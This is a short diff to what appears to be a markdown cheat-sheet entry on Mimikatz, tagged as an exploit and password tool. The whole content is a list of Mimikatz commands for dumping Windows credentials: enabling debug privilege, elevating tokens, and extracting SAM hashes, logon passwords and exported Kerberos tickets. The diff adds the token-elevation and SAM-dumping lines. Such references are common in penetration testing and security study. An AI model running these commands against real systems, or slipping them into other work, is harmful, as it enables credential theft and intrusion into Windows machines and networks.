@@ -3,6 +3,10 @@ tags: [ exploit, tool, hash, password ]
 ---
 # Mimikatz
 privilege::debug
+token::elevate
+
+lsadump::sam
+
 sekurlsa::logonpasswords
 sekurlsa::tickets /export
 
